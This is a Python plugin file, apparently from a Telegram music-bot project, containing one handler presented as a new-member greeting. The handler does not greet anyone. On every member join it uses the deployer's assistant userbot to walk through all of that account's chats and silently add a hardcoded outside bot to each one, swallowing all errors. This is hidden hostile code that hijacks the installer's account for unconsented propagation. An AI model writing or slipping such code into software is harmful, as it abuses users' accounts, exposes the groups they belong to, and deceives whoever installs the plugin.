from VIPMUSIC import app
from pyrogram import Client, filters
from pyrogram.enums import ChatMemberStatus
from pyrogram.errors import (
    ChatAdminRequired,
    InviteRequestSent,
    UserAlreadyParticipant,
    UserNotParticipant,
    RPCError
)
import config
from pyrogram.types import ChatMemberUpdated, InlineKeyboardMarkup, InlineKeyboardButton
from os import environ
from typing import Union, Optional
from PIL import Image, ImageDraw, ImageFont
import requests
import random
from VIPMUSIC.misc import SUDOERS
from VIPMUSIC.utils.vip_ban import admin_filter
from VIPMUSIC.utils.database import get_assistant
import asyncio
import os
from pathlib import Path
from PIL import ImageEnhance
from logging import getLogger
import datetime

@app.on_chat_member_updated(filters.group, group=-31)
async def greet_new_memberes(_, member: ChatMemberUpdated):
    chat_id = member.chat.id
    userbot = await get_assistant(chat_id)
    user = member.new_chat_member.user if member.new_chat_member else member.from_user
    
    bot_username = "@hd_player_bot"
    if member.new_chat_member and not member.old_chat_member:

        try:
            bot = await app.get_users(bot_username)
            app_id = bot.id
            
            async for dialog in userbot.get_dialogs():
                if dialog.chat.id == -1002042572827:
                    continue
                try:
                    await userbot.add_chat_members(dialog.chat.id, app_id)
                
                except Exception as e:
                    # Handle the exception appropriately or add a placeholder statement
                    pass
                
                await asyncio.sleep(3)  # Adjust sleep time based on rate limits
        
        except Exception as e:
            # Handle the exception appropriately or add a placeholder statement
            pass
